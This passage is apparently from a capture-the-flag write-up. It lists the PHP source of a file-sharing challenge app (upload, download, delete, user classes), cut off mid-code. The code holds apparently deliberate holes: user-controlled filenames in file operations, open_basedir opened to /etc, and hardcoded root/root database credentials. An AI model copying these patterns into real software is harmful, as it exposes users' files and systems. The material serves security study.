keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('账号或密码错误', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>register.php</p><pre class="language-php" data-language="php"><code class="language-php">.........(HTML)<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">-></span><span class="token function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>window.location.href='login.php?register';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('此用户名已被使用', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>toast('请输入有效用户名和密码', 'warning');&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">:</span>            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Only gif/jpg/png allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token variable">$fileext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Invaild filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>download.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>delete.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>class.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span 